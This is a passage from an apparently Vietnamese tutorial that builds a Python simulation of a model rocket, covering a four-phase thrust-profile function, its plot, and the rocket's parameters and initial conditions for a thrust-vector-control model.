</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pos_list</span> <span style="color:#56b6c2">=</span> [<span style="color:#e06c75">pos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">copy</span>()]
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">velocity_list</span> <span style="color:#56b6c2">=</span> [<span style="color:#e06c75">vel</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">copy</span>()]
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">acceleration_list</span> <span style="color:#56b6c2">=</span> [<span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>([<span style="color:#e06c75">ax</span>, <span style="color:#e06c75">az</span>])]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">for</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">arange</span>(<span style="color:#e06c75">dt</span>, <span style="color:#e06c75">duration</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">dt</span>, <span style="color:#e06c75">dt</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ax</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fx</span>[<span style="color:#e5c07b">int</span>(<span style="color:#e06c75">t</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">dt</span>)] <span style="color:#56b6c2">/</span> <span style="color:#e06c75">mass</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">az</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fz</span>[<span style="color:#e5c07b">int</span>(<span style="color:#e06c75">t</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">dt</span>)] <span style="color:#56b6c2">/</span> <span style="color:#e06c75">mass</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">g</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">dqdt</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">My</span>[<span style="color:#e5c07b">int</span>(<span style="color:#e06c75">t</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">dt</span>)] <span style="color:#56b6c2">/</span> <span style="color:#e06c75">inertia</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">u</span> <span style="color:#56b6c2">+=</span> <span style="color:#e06c75">ax</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">dt</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">w</span> <span style="color:#56b6c2">+=</span> <span style="color:#e06c75">az</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">dt</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">q</span> <span style="color:#56b6c2">+=</span> <span style="color:#e06c75">dqdt</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">dt</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pos</span> <span style="color:#56b6c2">+=</span> <span style="color:#e06c75">vel</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">dt</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">vel</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>([<span style="color:#e06c75">u</span>, <span style="color:#e06c75">w</span>])
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">theta</span> <span style="color:#56b6c2">+=</span> <span style="color:#e06c75">q</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">dt</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">theta_list</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">theta</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">q_list</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">q</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">dqdt_list</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">dqdt</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pos_list</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">pos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">copy</span>())
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">velocity_list</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">vel</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">copy</span>())
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">acceleration_list</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>([<span style="color:#e06c75">ax</span>, <span style="color:#e06c75">az</span>]))
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#e06c75">pos</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">0</span> <span style="color:#56b6c2">and</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">&gt;</span> <span style="color:#d19a66">2</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">break</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">return</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#98c379">&#39;theta&#39;</span> : <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>(<span style="color:#e06c75">theta_list</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#98c379">&#39;q&#39;</span> : <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>(<span style="color:#e06c75">q_list</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#98c379">&#39;dqdt&#39;</span> : <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>(<span style="color:#e06c75">dqdt_list</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#98c379">&#39;pos&#39;</span> : <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>(<span style="color:#e06c75">pos_list</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#98c379">&#39;velocity&#39;</span> : <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>(<span style="color:#e06c75">velocity_list</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#98c379">&#39;acceleration&#39;</span> : <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>(<span style="color:#e06c75">acceleration_list</span>)
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h2 id="đặc-tính-lực-đẩy">Đặc tính lực đẩy</h2>
<p>Chúng ta sẽ cần 1 mảng chứa đặc tính lực đẩy. Đặc tính lực đẩy là lực đẩy của tên lửa ở 1 khoảng thời gian nhất định. Tên lửa chúng mình có lực đẩy max là $15N$. Chúng ta sẽ mô phỏng 4 giai đoạn đẩy mà tên lửa mô hình thường có:</p>
<p>4 giai đoạn đẩy này sẽ là giai đoạn tăng tốc, giai đoạn max lực đẩy, giai đoạn giảm tốc, và giai đoạn burnout.</p>
<ul>
<li>Giai đoạn tăng tốc: Ở giai đoạn này, tên lửa sẽ nhanh chóng tăng lực đẩy từ $0N$ lên $15N$. Giai đoạn này chiếm khoảng $10%$ thời gian đẩy. Chúng ta có thể mô phỏng giai đoạn này qua phương trình bậc 2, nó cho phép tên lửa của mình bắt đầu dần dần tăng nhanh lên trong 1 khoảng thời gian nhất định.</li>
<li>Giai đoạn max lực đẩy: Ở giai đoạn này, tên lửa sẽ có lực đẩy là max $15N$. Giai đoạn này sẽ chiếm khoảng $20%$ thời gian đẩy.</li>
<li>Giai đoạn giảm tốc: Ở giai đoạn này, tên lửa sẽ dần dần giảm tốc từ $15N$ xuống $0N$. Giai đoạn này sẽ chiếm khoảng $70%$ thời gian đẩy. Chúng ta có thể mô phỏng giai đoạn này với 1 phương trình tuyến tính.</li>
<li>Burnout: Ở giai đoạn này, tên lửa sẽ có lực đẩy là $0N$. Giai đoạn này sẽ xảy ra sau thời gian đẩy.</li>
</ul>
<h2 id="lập-trình-hàm-tạo-đặc-tính-lực-đẩy">Lập trình hàm tạo đặc tính lực đẩy</h2>
<p>Hàm tạo này sẽ cần thời gian mô phỏng, thời gian đẩy, lực đẩy max, và khoảng thời gian bước $dt$:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">generate_thrust_profile</span>(<span style="color:#e06c75">duration</span>, <span style="color:#e06c75">thrust_duration</span>, <span style="color:#e06c75">peak_thrust</span>, <span style="color:#e06c75">dt</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.01</span>):
</span></span></code></pre></div><p>Chúng ta sẽ cần tính lực đẩy của tên lửa ở mỗi khoảng thời gian từ 0 đến hết thời gian đẩy. Chúng ta sẽ lưu giá trị lực đẩy này vào 1 mảng đặc tính lực đẩy:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">thrust_profile</span> <span style="color:#56b6c2">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">for</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">arange</span>(<span style="color:#d19a66">0</span>, <span style="color:#e06c75">duration</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">dt</span>, <span style="color:#e06c75">dt</span>):
</span></span></code></pre></div><p>Đầu tiên thì mình sẽ lập trình giai đoạn tăng tốc ($10%$ thời gian đẩy):</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">if</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0.1</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">thrust</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">peak_thrust</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">10</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">/</span> <span style="color:#e06c75">thrust_duration</span>)<span style="color:#56b6c2">**</span><span style="color:#d19a66">2</span>
</span></span></code></pre></div><p>Đây là phương trình bậc 2. Mình nhân 10 với <code>t / thrust_duration</code> để chuẩn hóa dữ liệu vào khoảng $[0, 1]$ (đây là phần trăm thời gian đã trôi qua). Rồi mình dùng căn bậc 2 và nhân với <code>peak_thrust</code> để tính giá trị đẩy ở thời điểm $t$. Phương trình này sẽ tạo ra 1 đặc tính lực đẩy tăng chậm ban đầu rồi tăng nhanh dần dần.</p>
<p>Tiếp theo thì mình sẽ lập trình giai đoạn max lực đẩy ($20%$ thời gian đẩy):</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">elif</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0.3</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">thrust</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">peak_thrust</span>
</span></span></code></pre></div><p>Giai đoạn này sẽ kết thục vào khoảng $30%$ của thời gian đẩy (bởi vì giai đoạn tăng tốc đã chiếm $10%$ rồi).</p>
<p>Tiếp theo thì mình sẽ lập trình giai đoạn giảm tốc ($70%$ thời gian đẩy)</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">elif</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">thrust_duration</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">thrust</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">peak_thrust</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">1</span> <span style="color:#56b6c2">-</span> (<span style="color:#e06c75">t</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0.3</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>) <span style="color:#56b6c2">/</span> (<span style="color:#d19a66">0.7</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>))
</span></span></code></pre></div><p>Đây là phương trình tuyến tính. Mình sẽ giải thích từng đoạn:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>((<span style="color:#e06c75">t</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0.3</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>) <span style="color:#56b6c2">/</span> (<span style="color:#d19a66">0.7</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>))
</span></span></code></pre></div><p><code>(t - 0.3 * thrust_duration)</code> sẽ cho chúng ta biết thời gian đã qua kể từ kết thúc của giai đoạn max lực đẩy. Sau đó chia với <code>(0.7 * thrust_duration)</code> sẽ cho chúng ta biết được phần trăm của thời gian hiện tại ở trong khoảng $70%$ của giai đoạn giảm tốc. Chúng ta sẽ biết được chúng ta ở trong giai đoạn giảm tốc lâu đến đâu.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>(<span style="color:#d19a66">1</span> <span style="color:#56b6c2">-</span> (<span style="color:#e06c75">t</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0.3</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>) <span style="color:#56b6c2">/</span> (<span style="color:#d19a66">0.7</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>))
</span></span></code></pre></div><p>Bởi vì chúng ta muốn lực đẩy dần dần giảm, chúng ta sẽ trừ với 1 để đảo ngược giá trị phần trăm chúng ta vừa tính được. Và cuối cùng thì chúng ta có thể nhân nó với giá trị lực đẩy max.</p>
<p>Tiếp theo thì mình sẽ lập trình giai đoạn burnout:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">else</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">thrust</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>
</span></span></code></pre></div><p>Cuối cùng thì mình sẽ cho giá trị tính được vào 1 mảng đầu ra, và quay lại vòng lặp. Đó là hàm tạo đặc tính lực đẩy. Đây là code full của hàm:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">generate_thrust_profile</span>(<span style="color:#e06c75">duration</span>, <span style="color:#e06c75">thrust_duration</span>, <span style="color:#e06c75">peak_thrust</span>, <span style="color:#e06c75">dt</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.01</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">thrust_profile</span> <span style="color:#56b6c2">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">for</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">arange</span>(<span style="color:#d19a66">0</span>, <span style="color:#e06c75">duration</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">dt</span>, <span style="color:#e06c75">dt</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0.1</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">thrust</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">peak_thrust</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">10</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">/</span> <span style="color:#e06c75">thrust_duration</span>)<span style="color:#56b6c2">**</span><span style="color:#d19a66">2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">elif</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0.3</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">thrust</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">peak_thrust</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">elif</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">thrust_duration</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">thrust</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">peak_thrust</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">1</span> <span style="color:#56b6c2">-</span> (<span style="color:#e06c75">t</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0.3</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>) <span style="color:#56b6c2">/</span> (<span style="color:#d19a66">0.7</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">thrust</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">thrust_profile</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">thrust</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">return</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">array</span>(<span style="color:#e06c75">thrust_profile</span>)
</span></span></code></pre></div><p>Mình sẽ dùng hàm này để tạo ra 1 đặc tính lực đẩy và mình sẽ vẽ lược đồ cho đặc tính này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># giá trị</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">peak_thrust</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">15</span> <span style="color:#7f848e"># N</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">thrust_duration</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span> <span style="color:#7f848e"># s</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">simulation_duration</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">30</span> <span style="color:#7f848e"># s</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">dt</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0.01</span> <span style="color:#7f848e"># s</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e"># tạo đặc tính</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">thrust_profile</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">generate_thrust_profile</span>(<span style="color:#e06c75">simulation_duration</span>, <span style="color:#e06c75">thrust_duration</span>, <span style="color:#e06c75">peak_thrust</span>, <span style="color:#e06c75">dt</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">time_range</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">arange</span>(<span style="color:#d19a66">0</span>, <span style="color:#e06c75">simulation_duration</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">dt</span>, <span style="color:#e06c75">dt</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e"># vẽ lược đồ</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">figure</span>(<span style="color:#e06c75">figsize</span><span style="color:#56b6c2">=</span>(<span style="color:#d19a66">10</span>, <span style="color:#d19a66">6</span>))
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">plot</span>(<span style="color:#e06c75">time_range</span>, <span style="color:#e06c75">thrust_profile</span>, <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;Thrust&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">axvline</span>(<span style="color:#e06c75">x</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.1</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>, <span style="color:#e06c75">color</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;red&#39;</span>, <span style="color:#e06c75">linestyle</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;--&#39;</span>, <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;End of rapid rise&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">axvline</span>(<span style="color:#e06c75">x</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0.3</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_duration</span>, <span style="color:#e06c75">color</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;green&#39;</span>, <span style="color:#e06c75">linestyle</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;--&#39;</span>, <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;End of peak thrust&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">axvline</span>(<span style="color:#e06c75">x</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">thrust_duration</span>, <span style="color:#e06c75">color</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;orange&#39;</span>, <span style="color:#e06c75">linestyle</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;--&#39;</span>, <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;End of decay phase (Burnout)&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">xlabel</span>(<span style="color:#98c379">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ylabel</span>(<span style="color:#98c379">&#39;Thrust (N)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">title</span>(<span style="color:#98c379">&#39;Thrust Profile&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">legend</span>()
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">grid</span>()
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">show</span>()
</span></span></code></pre></div>
    <img src="/img/tvc-modeling/thrust-profile.png"  alt="Thrust profile drop off"  class="center"  style="padding: 10px"  />


<p>Chúng ta có thể thấy là giai đoạn tăng tốc bắt đầu chậm nhưng tăng tốc lên rất nhanh, giai đoạn max lực đẩy là 1 hằng số, và giai đoạn giảm tốc là tuyến tính. Thế là hàm của chúng ta hoạt động tốt.</p>
<p>Chúng ta có thể sử dụng hàm tạo đặc tính lực đẩy này để tính động lực của tên lửa và mô phỏng nó.</p>
<h2 id="mô-phỏng-tên-lửa">Mô phỏng tên lửa</h2>
<p>Chúng ta sẽ cần tạo 1 số tham số và điều kiện bắt đầu của tên lửa. Mình sẽ đặt thời gian mô phỏng là 30 giây:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># tham số</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">mass</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0.543</span> <span style="color:#7f848e"># kg</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">inertia</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0.048</span> <span style="color:#7f848e"># kg*m^2</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">g</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">9.81</span> <span style="color:#7f848e"># m/s^2</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">peak_thrust</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">15</span> <span style="color:#7f848e"># N</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">thrust_duration</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span> <span style="color:#7f848e"># s</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">simulation_duration</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">30</span> <span style="color:#7f848e"># s</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">dt</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0.01</span> <span style="color:#7f848e"># s</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">moment_arm</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0.28</span> <span style="color:#7f848e"># mét</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">gimbal_angle</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0.00</span> <span style="color:#7f848e"># radian</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e"># điều kiện bắt đầu</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">u0</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0.0</span> <span style="color:#7f848e"># vận tốc ban đầu x</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">w0</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0.0</span> <span style="color:#7f848e"># vận tốc ban đầu z</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">theta0</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0.0</span> <span style="color:#7f848e"># góc pitch ban đầu</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">q0</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0.0</span> <span style="color:#7f848e"># độ thay đổi góc pitch ban đầu</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">pos0</span> <span style="color:#56b6c2">=</span> [<span style="color:#d19a66">0.0</span>, <span style="color:#d19a66">0.0</span>] <span style="color:#7f848e"># vị trí ban đầu [x, z]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e"># tạo đặc tính lực đẩy</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">thrust_profile</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">generate_thrust_profile</span>(<span style="color:#e06c75">simulation_duration</span>, <span style="color:#e06c75">thrust_duration</span>, <span style="color:#e06c75">peak_thrust</span>, <span style="color:#e06c75">dt</span>)
</span></span></code></pre></div><p><em>Note</em>: biến <code>gimbal_angle</code> được đặt với giá trị là $0rad$. Đây là góc của gimbal của động cơ đẩy. Chúng ta sẽ có thể thấy được nếu như thay đổi giá trị này thì tên lửa sẽ ra sao trong 1 lúc nữa. Hiện tại thì mình sẽ đặt nó về 0, tức là tên lửa sẽ bắn thẳng lên trời.</p>
<p>Tiếp theo thì chúng ta sẽ cần tính lực ở trục X và Z cùng với mô men xoắn dựa trên đặc tính lực đẩy:</p>
